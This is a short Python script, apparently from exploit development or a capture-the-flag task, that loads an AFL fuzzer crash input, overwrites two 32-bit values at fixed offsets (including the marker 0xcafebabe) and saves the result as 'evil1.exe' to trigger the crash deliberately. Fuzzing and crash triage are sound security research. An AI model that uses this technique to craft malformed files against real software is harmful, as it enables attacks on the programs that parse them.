from ptrlib import *

with open("output/crashes/id:000000,sig:11,src:000000,op:flip1,pos:373", "rb") as f:
    buf = f.read()

buf = buf[:0x6bb8] + p32(1) + buf[0x6bb8+4:]
buf = buf[:0x6bc0] + p32(0xcafebabe) + buf[0x6bc0+4:]

with open("evil1.exe", "wb") as f:
    f.write(buf)

